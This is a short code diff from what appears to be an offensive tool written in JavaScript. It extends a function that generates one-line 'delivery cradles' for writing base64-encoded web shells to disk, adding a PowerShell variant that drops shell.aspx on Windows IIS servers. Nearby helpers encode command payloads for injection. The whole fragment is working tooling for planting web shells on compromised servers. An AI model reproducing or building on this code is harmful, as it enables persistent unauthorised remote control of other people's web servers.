@@ -108,7 +108,13 @@
   function urlEncode(cmd) { return encodeURIComponent(String(cmd)); }
   // A one-line delivery cradle for a web shell file: decode the base64 straight to disk, so a multi-line
   // JSP/ASPX never gets mangled by pasting raw source over a fragile prompt. ext picks the output name.
-  function webshellCradle(code, ext) { return "echo '" + b64utf8(code) + "' | base64 -d > shell." + (ext || 'php'); }
+  // ASPX lands on a Windows IIS box where cmd.exe has no base64, so it gets a PowerShell cradle instead.
+  function webshellCradle(code, ext) {
+    ext = ext || 'php';
+    var b64 = b64utf8(code);
+    if (ext === 'aspx') return "powershell -Command \"[IO.File]::WriteAllBytes('shell.aspx', [Convert]::FromBase64String('" + b64 + "'))\"";
+    return "echo '" + b64 + "' | base64 -d > shell." + ext;
+  }
   // encodePayload(cmd, how): how = 'b64' (base64 runner) | 'url' (percent-encoded) | anything else = raw.
   function encodePayload(cmd, how) { return how === 'b64' ? b64Runner(cmd) : (how === 'url' ? urlEncode(cmd) : String(cmd)); }
 
